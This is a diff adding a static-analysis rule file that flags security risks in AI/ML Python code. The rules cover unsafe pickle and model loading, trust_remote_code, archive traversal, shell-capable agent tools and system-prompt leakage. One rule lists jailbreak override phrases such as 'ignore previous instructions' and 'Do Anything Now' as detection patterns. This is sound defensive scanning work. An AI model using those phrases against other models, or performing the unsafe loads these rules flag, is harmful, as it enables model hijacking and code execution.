@@ -1,0 +1,3415 @@
+rules:
+- id: ns-aiml-030
+  languages:
+  - python
+  severity: ERROR
+  message: torch.load() without weights_only=True enables arbitrary code execution via pickle
+  patterns:
+  - pattern-regex: torch\.load\(
+  - pattern-not-regex: weights_only\s*=\s*True
+  - pattern-not-regex: safetensors
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI001
+    residual:
+    - sanitizer
+- id: ns-aiml-031
+  languages:
+  - python
+  severity: ERROR
+  message: joblib.load() deserializes arbitrary Python objects via pickle
+  patterns:
+  - pattern-regex: joblib\.load\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI010
+    residual:
+    - sanitizer
+- id: ns-aiml-032
+  languages:
+  - python
+  severity: ERROR
+  message: np.load() with allow_pickle=True enables arbitrary code execution
+  patterns:
+  - pattern-regex: np\.load\([^)]*allow_pickle\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI011
+    residual:
+    - sanitizer
+- id: ns-aiml-033
+  languages:
+  - python
+  severity: ERROR
+  message: shelve.open() uses pickle internally and is unsafe with untrusted data
+  patterns:
+  - pattern-regex: shelve\.open\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI019
+    residual:
+    - sanitizer
+- id: ns-aiml-034
+  languages:
+  - python
+  severity: ERROR
+  message: pickle/cPickle deserialization enables arbitrary code execution. Presence signal; confirm the pickle source is
+    user-controlled.
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bpickle\.loads?\(
+    - pattern-regex: \bcPickle\.loads?\(
+    - pattern-regex: \b_pickle\.loads?\(
+  - pattern-not-regex: \.pickle\.load
+  - pattern-not-regex: torch\.load
+  - pattern-not-regex: model\.load
+  - pattern-not-regex: from_pretrained
+  - pattern-not-regex: joblib\.load
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI023
+    residual:
+    - sanitizer
+- id: ns-aiml-035
+  languages:
+  - python
+  severity: ERROR
+  message: DeepSpeed checkpoint loading may deserialize untrusted pickle data
+  patterns:
+  - pattern-either:
+    - pattern-regex: load_checkpoint\(
+    - pattern-regex: init_inference\(
+    - pattern-regex: ds_model_config\.pkl
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI038
+    residual:
+    - sanitizer
+- id: ns-aiml-036
+  languages:
+  - python
+  severity: ERROR
+  message: dill/cloudpickle deserialization enables arbitrary code execution
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bdill\.loads?\(
+    - pattern-regex: \bcloudpickle\.loads?\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI046
+    residual:
+    - sanitizer
+- id: ns-aiml-037
+  languages:
+  - python
+  severity: ERROR
+  message: pandas read_pickle / numpy allow_pickle deserializes untrusted objects
+  patterns:
+  - pattern-either:
+    - pattern-regex: pd\.read_pickle\(
+    - pattern-regex: pandas\.read_pickle\(
+    - pattern-regex: np\.load\([^)]*allow_pickle\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI048
+    residual:
+    - sanitizer
+- id: ns-aiml-038
+  languages:
+  - python
+  severity: ERROR
+  message: vLLM with trust_remote_code enables arbitrary code execution from model repos
+  patterns:
+  - pattern-either:
+    - pattern-regex: vllm\.entrypoints\.openai\.api_server
+    - pattern-regex: vllm\.LLM\(
+    - pattern-regex: trust_remote_code\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI059
+    residual:
+    - sanitizer
+- id: ns-aiml-039
+  languages:
+  - python
+  severity: ERROR
+  message: torch.jit.load() can execute arbitrary code from TorchScript archives
+  patterns:
+  - pattern-regex: torch\.jit\.load\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI072
+    residual:
+    - sanitizer
+- id: ns-aiml-040
+  languages:
+  - python
+  severity: ERROR
+  message: marshal.loads() can execute arbitrary bytecode
+  patterns:
+  - pattern-regex: marshal\.loads?\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI073
+    residual:
+    - sanitizer
+- id: ns-aiml-041
+  languages:
+  - python
+  severity: ERROR
+  message: msgpack with pickle fallback enables arbitrary code execution
+  patterns:
+  - pattern-either:
+    - pattern-regex: msgpack\.unpackb\(
+    - pattern-regex: msgpack\.loads?\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: deserialization
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI075
+    residual:
+    - sanitizer
+- id: ns-aiml-043
+  languages:
+  - python
+  severity: ERROR
+  message: Keras model_from_json/model_from_config can execute arbitrary code via importlib
+  patterns:
+  - pattern-either:
+    - pattern-regex: keras\.models\.model_from_json\(
+    - pattern-regex: keras\.models\.model_from_config\(
+    - pattern-regex: tf\.keras\.models\.model_from_json\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: code_execution
+    cwe:
+    - 94
+    original_engine: neuroscan
+    source_rule: AI031
+- id: ns-aiml-114
+  languages:
+  - python
+  severity: WARNING
+  message: keras.models.load_model()/keras.saving.load_model() executes arbitrary code if the loaded archive contains a Lambda
+    layer (CVE-2024-3660) or, in Keras 3 < 3.9, a crafted Model.from_config payload (CVE-2025-1550). Presence signal; confirm
+    the model source is user-controlled. Pass safe_mode=True to reject unsafe layers at load time (safe_mode defaults to True
+    since Keras 2.13 but the kwarg does not exist in earlier versions, so upgrading matters as much as passing it explicitly).
+    The model-file scanner (MFV-KERAS-001) independently flags Lambda layers found inside .h5/.keras archives.
+  patterns:
+  - pattern-either:
+    - pattern-regex: keras\.models\.load_model\(
+    - pattern-regex: tf\.keras\.models\.load_model\(
+    - pattern-regex: keras\.saving\.load_model\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: safe_mode\s*=\s*False
+  metadata:
+    category: code_execution
+    cwe:
+    - 94
+    - 502
+    original_engine: neuroscan
+    source_rule: AI031
+- id: ns-aiml-115
+  languages:
+  - python
+  severity: ERROR
+  message: keras.models.load_model(..., safe_mode=False) explicitly disables the Lambda-layer/unsafe-deserialization safety
+    check, allowing arbitrary code execution on load (CVE-2024-3660).
+  patterns:
+  - pattern-either:
+    - pattern-regex: keras\.models\.load_model\([^)]*safe_mode\s*=\s*False
+    - pattern-regex: tf\.keras\.models\.load_model\([^)]*safe_mode\s*=\s*False
+    - pattern-regex: keras\.saving\.load_model\([^)]*safe_mode\s*=\s*False
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: code_execution
+    cwe:
+    - 94
+    - 502
+    original_engine: neuroscan
+    source_rule: AI031
+- id: ns-aiml-044
+  languages:
+  - python
+  severity: ERROR
+  message: joblib.Parallel may evaluate untrusted callables
+  patterns:
+  - pattern-regex: joblib\.Parallel\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: code_execution
+    cwe:
+    - 94
+    original_engine: neuroscan
+    source_rule: AI032
+- id: ns-aiml-045
+  languages:
+  - python
+  severity: INFO
+  message: 'operator.attrgetter/itemgetter can be chained as gadgets for code execution: theoretical gadget-chain awareness,
+    not a confirmed vulnerability'
+  patterns:
+  - pattern-either:
+    - pattern-regex: operator\.attrgetter\(
+    - pattern-regex: operator\.itemgetter\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: code_execution
+    cwe:
+    - 94
+    original_engine: neuroscan
+    source_rule: AI041
+- id: ns-aiml-046
+  languages:
+  - python
+  severity: WARNING
+  message: exec()/eval()/compile() enables arbitrary code execution. Presence signal; confirm input reaches the call.
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bexec\(
+    - pattern-regex: \beval\(
+    - pattern-regex: \bcompile\(
+  - pattern-not-regex: \.eval\(
+  - pattern-not-regex: \.exec\(
+  - pattern-not-regex: \.compile\(
+  - pattern-not-regex: \bexecutor\b
+  - pattern-not-regex: eval\(['"](?:True|False|None|0|1|\d+\.?\d*)['"]\)
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|def eval_|conftest|unittest)
+  metadata:
+    category: injection
+    cwe:
+    - 94
+    - 95
+    original_engine: neuroscan
+    source_rule: AI051
+    residual:
+    - sanitizer
+- id: ns-aiml-047
+  languages:
+  - python
+  severity: INFO
+  message: from_pretrained() without revision pin may load tampered model weights. Supply-chain hygiene signal; real RCE risk
+    is trust_remote_code=True (ns-aiml-059).
+  patterns:
+  - pattern-regex: from_pretrained\(
+  - pattern-not-regex: revision\s*=
+  - pattern-not-regex: trust_remote_code
+  - pattern-not-regex: local_files_only\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: supply_chain
+    cwe:
+    - 829
+    - 494
+    original_engine: neuroscan
+    source_rule: AI013
+- id: ns-aiml-048
+  languages:
+  - python
+  severity: WARNING
+  message: Dynamic import of untrusted modules enables arbitrary code execution. Presence signal; confirm the module path
+    is user-controlled.
+  patterns:
+  - pattern-either:
+    - pattern-regex: importlib\.import_module\(
+    - pattern-regex: __import__\(
+    - pattern-regex: spec_from_file_location\(
+    - pattern-regex: imp\.load_source\(
+  - pattern-not-regex: import_module\(['"](?:os|sys|math|json|collections|itertools|typing|dataclasses|pathlib|logging|datetime|re|string|enum|functools|abc|contextlib|argparse|shutil|tempfile|io|hashlib|base64|uuid|copy|time|socket|struct|textwrap|webbrowser|glob|fnmatch)['"]
+  - pattern-not-regex: pkg_resources
+  - pattern-not-regex: importlib_metadata
+  - pattern-not-regex: entry_points
+  - pattern-not-regex: plugin
+  - pattern-not-regex: register
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: supply_chain
+    cwe:
+    - 94
+    - 829
+    original_engine: neuroscan
+    source_rule: AI016
+- id: ns-aiml-049
+  languages:
+  - python
+  severity: ERROR
+  message: Hydra/OmegaConf resolver with user input enables remote code execution
+  patterns:
+  - pattern-either:
+    - pattern-regex: OmegaConf\.to_container\([^)]*resolve\s*=\s*True
+    - pattern-regex: OmegaConf\.create\(
+    - pattern-regex: compose\([^)]*overrides\s*=
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: supply_chain
+    cwe:
+    - 94
+    - 917
+    original_engine: neuroscan
+    source_rule: AI034
+- id: ns-aiml-050
+  languages:
+  - python
+  severity: ERROR
+  message: setup.py cmdclass/scripts hooks can execute arbitrary code during install
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bcmdclass\s*=\s*\{
+    - pattern-regex: \bscripts\s*=\s*\[
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: supply_chain
+    cwe:
+    - 829
+    original_engine: neuroscan
+    source_rule: AI037
+- id: ns-aiml-051
+  languages:
+  - python
+  severity: WARNING
+  message: Config format routing to pickle/torch.load enables deserialization attacks. Presence signal; confirm the model
+    source is user-controlled.
+  patterns:
+  - pattern-either:
+    - pattern-regex: format\s*==\s*["'](?:pt|pytorch|bin)["']
+    - pattern-regex: torch\.load\(
+    - pattern-regex: pickle\.load\(
+  - pattern-not-regex: weights_only\s*=\s*True
+  - pattern-not-regex: safetensors
+  - pattern-not-regex: torch\.load\([^)]*map_location\s*=
+  - pattern-not-regex: torch\.load\([^)]*mmap\s*=\s*True
+  - pattern-not-regex: if\s+format\s+in\s+\[
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: supply_chain
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI044
+    residual:
+    - sanitizer
+- id: ns-aiml-052
+  languages:
+  - python
+  severity: INFO
+  message: 'RAG pipeline detected: treat retrieved/vector-store content as untrusted (indirect prompt injection surface).
+    Heuristic awareness, not a confirmed vulnerability; real dataflow is covered by TNT-ML-004.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: LLMChain\(
+    - pattern-regex: retriever\.get_relevant_documents\(
+    - pattern-regex: similarity_search\(
+    - pattern-regex: VectorStoreRetriever\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 77
+    original_engine: neuroscan
+    source_rule: AI008
+    residual:
+    - sanitizer
+- id: ns-aiml-053
+  languages:
+  - generic
+  severity: WARNING
+  message: Jailbreak prompt pattern detected
+  patterns:
+  - pattern-either:
+    - pattern-regex: Do Anything Now
+    - pattern-regex: DAN\s*6\.0
+    - pattern-regex: ignore (?:all )?previous instructions
+    - pattern-regex: Developer Mode
+    - pattern-regex: stay in character
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 77
+    original_engine: neuroscan
+    source_rule: AI029
+    residual:
+    - sanitizer
+  paths:
+    include:
+    - '*.py'
+    - '*.pyi'
+    - '*.js'
+    - '*.jsx'
+    - '*.mjs'
+    - '*.cjs'
+    - '*.ts'
+    - '*.tsx'
+    - '*.txt'
+- id: ns-aiml-054
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: INFO
+  message: Tool-call arguments are model-controlled; review the selected handler's capabilities and authorization
+  patterns:
+  - pattern-either:
+    - pattern-regex: action\.tool_input
+    - pattern-regex: tool\.function\.arguments
+    - pattern-regex: function_call.*arguments
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 20
+    original_engine: neuroscan
+    source_rule: AI050
+    residual:
+    - sanitizer
+- id: ns-aiml-055
+  languages:
+  - python
+  severity: WARNING
+  message: Prompt template interpolates a request value without sanitization. Cross-statement flows are covered by the taint
+    rule TNT-ML-009.
+  patterns:
+  - pattern-either:
+    - pattern-regex: PromptTemplate\.from_template\([^)]*\brequest\b
+    - pattern-regex: ChatPromptTemplate\.from_messages\([^)]*\brequest\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 77
+    original_engine: neuroscan
+    source_rule: AI059
+    residual:
+    - sanitizer
+- id: ns-aiml-056
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: System prompt may be leaked via debug endpoints or message inspection
+  patterns:
+  - pattern-either:
+    - pattern-regex: messages\[0\]\[.content.\]
+    - pattern-regex: '@app\.route\([''"](?:debug|inspect|system|prompt)'
+    - pattern-regex: return\s+(?:json\w*\()?\s*system_prompt\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 200
+    - 497
+    original_engine: neuroscan
+    source_rule: AI064
+    residual:
+    - sanitizer
+- id: ns-aiml-057
+  languages:
+  - python
+  severity: INFO
+  message: ONNX custom operator registration may execute arbitrary native code. Presence signal; only register_custom_op with
+    untrusted shared libs is a real risk.
+  patterns:
+  - pattern-either:
+    - pattern-regex: register_custom_op\(
+    - pattern-regex: onnxruntime\.InferenceSession\([^)]*custom
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 94
+    original_engine: neuroscan
+    source_rule: AI006
+- id: ns-aiml-058
+  languages:
+  - python
+  severity: ERROR
+  message: GGUF model loading may execute embedded code or trigger buffer overflows
+  patterns:
+  - pattern-either:
+    - pattern-regex: llama_cpp\.Llama\(
+    - pattern-regex: llama\.load_model\(
+    - pattern-regex: llama_cpp_python\.Llama\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI007
+- id: ns-aiml-059
+  languages:
+  - python
+  severity: ERROR
+  message: trust_remote_code=True allows arbitrary code execution from model repositories
+  patterns:
+  - pattern-regex: trust_remote_code\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: load_dataset\(
+  metadata:
+    category: model_integrity
+    cwe:
+    - 829
+    original_engine: neuroscan
+    source_rule: AI024
+- id: ns-aiml-113
+  languages:
+  - python
+  severity: ERROR
+  message: datasets.load_dataset(..., trust_remote_code=True) executes the dataset's loading script as arbitrary Python at
+    load time. Unlike model repos, HF datasets no longer requires loading scripts for standard formats (parquet/arrow) --
+    prefer a dataset revision that ships data files directly over trusting the script, rather than pinning revision= on the
+    script itself (ns-aiml-059 covers the model-repo case).
+  patterns:
+  - pattern-regex: load_dataset\([^)]*trust_remote_code\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 94
+    - 829
+    original_engine: neuroscan
+    source_rule: AI024
+- id: ns-aiml-060
+  languages:
+  - python
+  severity: INFO
+  message: Model download without integrity verification may load tampered weights. Presence signal, not a confirmed vulnerability.
+  patterns:
+  - pattern-either:
+    - pattern-regex: hf_hub_download\(
+    - pattern-regex: snapshot_download\(
+    - pattern-regex: model\.download\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 494
+    - 829
+    original_engine: neuroscan
+    source_rule: AI028
+- id: ns-aiml-061
+  languages:
+  - python
+  severity: ERROR
+  message: Explicit weights_only=False or allow_pickle=True disables safety guards
+  patterns:
+  - pattern-either:
+    - pattern-regex: weights_only\s*=\s*False
+    - pattern-regex: allow_pickle\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI043
+- id: ns-aiml-116
+  languages:
+  - python
+  severity: ERROR
+  message: keras.config.enable_unsafe_deserialization() globally disables Keras's Lambda-layer/unsafe-object safety checks
+    (the CVE-2024-3660 mitigation). Same class of explicit safety-off switch as weights_only=False/allow_pickle=True (ns-aiml-061).
+  patterns:
+  - pattern-regex: enable_unsafe_deserialization\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI043
+- id: ns-aiml-117
+  languages:
+  - python
+  severity: INFO
+  message: Lambda(lambda ...) layer embeds a marshalled Python function in the model graph. If this model is saved (model.save/.h5/.keras
+    export) and distributed, safe loaders (safe_mode=True, ns-aiml-114) will refuse it and scanners (MFV-KERAS-001) will flag
+    it -- consider a subclassed Layer instead of Lambda for anything meant to leave this process. Informational nudge; not
+    evidence the artifact is actually distributed.
+  patterns:
+  - pattern-regex: Lambda\(\s*lambda\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI043
+- id: ns-aiml-062
+  languages:
+  - python
+  severity: INFO
+  message: Quantization config may mask backdoored weight modifications. Presence signal, not a confirmed vulnerability.
+  patterns:
+  - pattern-either:
+    - pattern-regex: GPTQConfig\(
+    - pattern-regex: BitsAndBytesConfig\(
+    - pattern-regex: load_in_4bit\s*=\s*True
+    - pattern-regex: load_in_8bit\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 345
+    original_engine: neuroscan
+    source_rule: AI047
+- id: ns-aiml-063
+  languages:
+  - python
+  severity: WARNING
+  message: Archive extraction without path validation enables zip-slip attacks. Presence signal; use filter='data' or members=
+    to prevent traversal.
+  patterns:
+  - pattern-either:
+    - pattern-regex: \.extractall\(
+    - pattern-regex: tarfile\.open\(
+    - pattern-regex: \.extract\(
+  - pattern-not-regex: filter\s*=\s*["'\w]
+  - pattern-not-regex: members\s*=
+  - pattern-not-regex: 'tarfile\.open\([^)]*["'']r:'
+  - pattern-not-regex: tarfile\.open\([^)]*mode\s*=\s*["']r
+  - pattern-not-regex: ZipFile\([^)]*\).*\.extractall\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: path_traversal
+    cwe:
+    - 22
+    original_engine: neuroscan
+    source_rule: AI014
+    residual:
+    - sanitizer
+- id: ns-aiml-064
+  languages:
+  - python
+  severity: INFO
+  message: HDF5 external links can reference arbitrary filesystem paths
+  patterns:
+  - pattern-either:
+    - pattern-regex: h5py\.File\(
+    - pattern-regex: h5py\.Group\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: path_traversal
+    cwe:
+    - 22
+    original_engine: neuroscan
+    source_rule: AI022
+    residual:
+    - sanitizer
+- id: ns-aiml-065
+  languages:
+  - python
+  severity: INFO
+  message: MLflow tracking URI or artifact location may enable path traversal. Presence signal; confirm the path is user-controlled.
+  patterns:
+  - pattern-either:
+    - pattern-regex: mlflow\.set_tracking_uri\(
+    - pattern-regex: mlflow\.create_experiment\(
+    - pattern-regex: artifact_location
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: path_traversal
+    cwe:
+    - 22
+    original_engine: neuroscan
+    source_rule: AI056
+    residual:
+    - sanitizer
+- id: ns-aiml-066
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: ERROR
+  message: MCP server may be vulnerable to tool-call smuggling via untrusted input
+  patterns:
+  - pattern-either:
+    - pattern-regex: mcp\.run\(
+    - pattern-regex: mcp\.serve\(
+    - pattern-regex: mcp_server\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 77
+    original_engine: neuroscan
+    source_rule: AI070
+- id: ns-aiml-067
+  languages:
+  - python
+  severity: WARNING
+  message: Ray dashboard bound to 0.0.0.0 exposes cluster to unauthenticated access. Presence signal; confirm this config
+    is production-facing.
+  patterns:
+  - pattern-regex: dashboard_host\s*=\s*["']0\.0\.0\.0["']
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: ray_client_server_port
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 668
+    - 200
+    original_engine: neuroscan
+    source_rule: AI058
+- id: ns-aiml-069
+  languages:
+  - python
+  severity: ERROR
+  message: yaml.load() without SafeLoader enables arbitrary code execution
+  patterns:
+  - pattern-either:
+    - pattern-regex: yaml\.load\(
+    - pattern-regex: yaml\.unsafe_load\(
+    - pattern-regex: yaml\.full_load\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: xml_dos
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI012
+- id: ns-aiml-070
+  languages:
+  - python
+  severity: ERROR
+  message: XML parsing without entity resolution limits enables XXE / billion-laughs attacks
+  patterns:
+  - pattern-either:
+    - pattern-regex: xml\.etree\.ElementTree\.parse\(
+    - pattern-regex: ET\.parse\(
+    - pattern-regex: lxml\.etree\.parse\(
+    - pattern-regex: xml\.dom\.minidom\.parse\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: xml_dos
+    cwe:
+    - 611
+    original_engine: neuroscan
+    source_rule: AI018
+- id: ns-aiml-071
+  languages:
+  - python
+  severity: ERROR
+  message: Decompression of untrusted data without size limits enables decompression bombs
+  patterns:
+  - pattern-either:
+    - pattern-regex: gzip\.decompress\(
+    - pattern-regex: bz2\.decompress\(
+    - pattern-regex: lzma\.decompress\(
+    - pattern-regex: zlib\.decompress\(
+    - pattern-regex: tarfile\.open\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: xml_dos
+    cwe:
+    - 409
+    original_engine: neuroscan
+    source_rule: AI069
+- id: ns-aiml-072
+  languages:
+  - python
+  severity: ERROR
+  message: LangChain unsafe tool grants shell/code execution to LLM agent
+  patterns:
+  - pattern-either:
+    - pattern-regex: PythonREPL\(
+    - pattern-regex: PythonREPLTool\(
+    - pattern-regex: BashProcess\(
+    - pattern-regex: ShellTool\(
+    - pattern-regex: PALChain\(
+    - pattern-regex: SQLDatabaseChain\(
+    - pattern-regex: allow_dangerous_code\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: langchain
+    cwe:
+    - 78
+    - 94
+    original_engine: neuroscan
+    source_rule: AI003
+- id: ns-aiml-073
+  languages:
+  - python
+  severity: ERROR
+  message: LangChain URL loader may be exploited for SSRF via user-controlled URLs
+  patterns:
+  - pattern-either:
+    - pattern-regex: RecursiveUrlLoader\(
+    - pattern-regex: WebBaseLoader\(
+    - pattern-regex: SeleniumURLLoader\(
+    - pattern-regex: PlaywrightURLLoader\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: langchain
+    cwe:
+    - 918
+    original_engine: neuroscan
+    source_rule: AI054
+- id: ns-aiml-074
+  languages:
+  - python
+  severity: ERROR
+  message: LlamaIndex reader/query engine may enable path traversal or SQL injection
+  patterns:
+  - pattern-either:
+    - pattern-regex: SimpleDirectoryReader\(
+    - pattern-regex: download_loader\(
+    - pattern-regex: PandasQueryEngine\(
+    - pattern-regex: NLSQLTableQueryEngine\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: llamaindex
+    cwe:
+    - 22
+    - 89
+    original_engine: neuroscan
+    source_rule: AI066
+- id: ns-aiml-075
+  languages:
+  - python
+  severity: INFO
+  message: LangChain cache implementation present; review serialization and tenant isolation before deployment
+  patterns:
+  - pattern-either:
+    - pattern-regex: BaseCache\.\w+\(
+    - pattern-regex: InMemoryCache\(
+    - pattern-regex: SQLiteCache\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: langchain
+    cwe:
+    - 502
+    original_engine: neuroscan
+    source_rule: AI053
+- id: ns-aiml-076
+  languages:
+  - python
+  severity: WARNING
+  message: LLM agent with shell/subprocess access has excessive agency. Presence signal; confirm LLM-agent can invoke this
+    code and user input reaches it.
+  patterns:
+  - pattern-either:
+    - pattern-regex: os\.system\(
+    - pattern-regex: subprocess\.(?:run|Popen|call)\(
+    - pattern-regex: shell\s*=\s*True
+  - pattern-not-regex: shell\s*=\s*False
+  - pattern-not-regex: (?:argparse|sys\.argv|--help|setup\.py|pip\s+install|pip\s+uninstall)
+  - pattern-not-regex: subprocess\.(?:run|Popen|call)\(\[["'](?:git|docker|pip|npm|cargo|go|make|cmake)["']
+  - pattern-not-regex: subprocess\.(?:run|Popen|call)\([^)]*capture_output\s*=\s*True
+  - pattern-not-regex: subprocess\.(?:run|Popen|call)\([^)]*check\s*=\s*True
+  - pattern-not-regex: subprocess\.(?:run|Popen|call)\([^)]*text\s*=\s*True
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?:@fixture|@pytest)
+  metadata:
+    category: agent_safety
+    cwe:
+    - 78
+    original_engine: neuroscan
+    source_rule: AI068
+- id: ns-aiml-100
+  languages:
+  - dockerfile
